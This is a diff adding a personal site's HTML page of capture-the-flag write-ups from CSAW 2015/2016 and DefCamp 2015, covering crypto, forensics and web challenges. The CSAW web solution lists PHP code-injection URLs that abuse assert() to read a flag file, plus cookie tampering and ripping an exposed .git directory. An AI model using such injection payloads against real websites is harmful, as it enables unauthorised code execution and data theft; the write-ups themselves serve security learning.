@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    <link rel="stylesheet" type="text/css" href="stylesheets/stylesheet.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/github-dark.css" media="screen">
+    <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
+
+    <title></title>
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>Frankcash.GitHub.io</h1>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+
+        <div>
+          <div>
+            <h1>CSAW Qualifiers 2016</h1>
+            <p>September 16 - September 18, 2016</p>
+          </div>
+          <div>
+            <h3>Web 125: MFW (Solved)</h3>
+            <p><b>Question:</b>"Hey, I made my first website today. It's pretty cool and web7.9."</p>
+            <div>
+              <p><b>Solution:</b>Remote code execution through URL. Attached Burp as a proxy to my browser. Inspected the HTML, and notice possible <span class="code">?/page=flag</span>.
+              <p>The site also points out how it is built with git <span class="code">http://web.chal.csaw.io:8000/.git/config</span> is accessible.</p>
+              <p>I utilized a <a href="https://github.com/kost/dvcs-ripper">DVCS-ripper</a> to download the repository. Attempted file inclusion, but like the code shows it is not feasible.</p>
+              <p>After anaylzing the code I ran it locally and tried many different URLs. </p>
+              <p>The php code has seemingly interesting defense built into it to distract someone at first through defeating a local file inclusion <span class="code">assert("strpos('$file', '..') === false")<span>.</p>
+              <p>But <span class="code">assert()</span> will execute PHP code, and thus that is it's weak point.</p>
+              <p>I added a debug line of <code class="code">echo("%3cscript>console.log( 'Debug Objects: " . assert("file_exists('$file')") . "' );%3c/script>");</code> I then ran the following urls:</p>
+                <ol>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page=phpinfo();</span></li>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page=http://web.chal.csaw.io:8000/templates/flag.php</span></li>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page=file_get_contents(%22/templates/flag.php%22);</span></li>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page= flag')%26%26file_get_contents('/templates/flag</span></li>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page=flag%27)||die(%27templates/flag</span></li>
+                  <li><span class="code">http://web.chal.csaw.io:8000/?page=flag%27%29||var_dump%28file_get_contents%28%27templates/flag.php%27%29%29;//</span></li>
+
+                </ol>
+
+            </div>
+            <p><b>Flag:</b> <span class="code">flag{3vald_@ss3rt_1s_best_a$$ert}</span></p>
+          </div>
+          <div>
+            <h3>Forensics 50: Kill (Solved)</h3>
+            <p><b>Solution:</b> File is a corrupted <span class="code">.pcapng</span>.  It will not open in Wireshark or tcpdump. File is readable through python.  I created a python script to find the flag.</p>
+            <pre class="code">
+              import re
+              pattern = 'flag\{.*\}'
+              for i, line in enumerate(open('kill.pcapng')):
+                  for match in re.finditer(pattern, line):
+                      print 'Found on line %s: %s' % (i+1, match.group(0))
+            </pre>
+            <p><b>Flag:</b> <span class="code">flag{roses_r_blue_violets_r_r3d_mayb3_harambae_is_not_kill}</span></p>
+          </div>
+
+        </div>
+
+        <div>
+          <div>
+            <h1> DefCamp Qualifiers 2015 </h1>
+            <p>October 02 - October 04, 2015</p>
+          </div>
+          <div>
+            <h2>Crypto 50: (Solved) </h2>
+            <p><b>Question:</b> 11 short texts have been encrypted with the same stream cipher. No no! Figure out the 11th plaintext!</p>
+            <p><b>Solution:</b> I originally attempted just xor-ing cipher 11 to the other ciphers.
+              I then realized that crib dragging was necessary due to "same stream cipher" description in the problem. <a href="https://github.com/frankcash/ctfs/blob/master/defcamp2015/xor.py">I quickly coded up a crib dragging xor solution (xor.py)</a>.
+              Guessed at the key quite a few times more than I'd like to admit and then guessed cipher which started to decrypt. And repeated this process a few time.
+            </p>
+            <pre class="code">
+              from binascii import unhexlify
+
+              def strxor(a, b):     # xor two strings of different lengths
+                if len(a) > len(b):
+                    return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a[:len(b)], b)])
+                else:
+                    return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b[:len(a)])])
+
+
+              def main(idx):
+                  x = strxor(unhexlify(ciphertexts[idx]), unhexlify(target))
+                  print "Ciphertext[%s] xor Target\n" % str(idx)
+                  # crib = raw_input("Enter Crib:>")
+                  crib = "when using "
+                  print "Crib\n~%s~" % crib
+
+                  # Crib Drag
+                  for i in range(len(x)):
+                      z = x[i:]
+                      print "\n[%d]" % i
+                      print "%s" % strxor(z, crib)
+
+
+              if __name__ == "__main__":
+                  for idx, cipher in enumerate(ciphertexts):
+                      main(idx)
+
+            </pre>
+            <p><b>Flag:</b> <span class="code">When using a stream cipher, never use the key more than once!</span></p>
+          </div>
+          <div>
+            <h2>Web 100: (Solved)</h2>
+            <p><b>Problem:</b> Web site with simple input box, adds a cookie that keep track of your "money". You only gain $10 with the provided code but need to reach enough to 'buy' the flag</p>
+            <p><b>Solution:</b> Full path disclosure by setting the cookie value to null. Ran <span class="code">document.cookie="PHPSESSID="</span> in the JavaScript console.</p>
+            <p><b>Flag:</b> <span class="code">DCTF{3a9bad36a0fb1edcaa83b6669d667061}</span></p>
+          </div>
+          <div>
+            <h2>Misc 100: (Solved)</h2>
+            <p><b>Problem:</b> Broken .png file (m100.png)</p>
+            <p><b>Solution:</b> I utilized a bunch of tools on this problem. First I ran pngcheck to see what the problem was. I then did some research and found out this is a checksum error. So I then utilized PNGCSum to fix it. After that the picture was finally "fixed." But something appeared to be cut off. I then edited the headers to resize it from 666x519 to 666x666. This revealed the text, which was crooked. I opened the image in GNU Image Processor to change the perspective of the text.</p>
+            <img src="/static/pics/m100_solved.png" height="300"/>
+            <p><b>Flag:</b> <span class="code">s1z3_d03s_ma773r_baby</span></p>
+          </div>
+
+        </div>
+
+
+
+        <div>
+          <div>
+            <h1>CSAW Qualifiers 2015</h1>
+            <p>September 18 - September 20, 2015</p>
+          </div>
+          <div>
+            <h3>Forensics 100: Transfer (Solved)</h3>
+            <p><b>Solution:</b>Utilized Wireshark. Applied the filter <span class="code">http</span> and <span class="code">!http.host==google.com and !http.host==www.google.com</span>.
+          Revealed packet 60. Upon further investigating of that packet it's a python script.
+          If you analyze the python script you see that they're randomly choosing an encryption method. If you reverse the steps you can easily reveal the flag.</p>
+            <p><b>Flag:</b> <span class="code">flag{li0ns_and_tig3rs_4nd_b34rs_0h_mi}</span></p>
+          </div>
+          <div>
+            <h3>Trivia 10: Trivia 1 (Solved)</h3>
+            <p><b>Question:</b>This family of malware has gained notoriety after anti-virus and threat intelligence companies claimed that it was being used by several Chinese military groups.</p>
+            <p><b>Solution:</b> PlugX </p>
+          </div>
+
+
+        </div>
+
+
+      </section>
+    </div>
+
+
+  </body>
+</html>
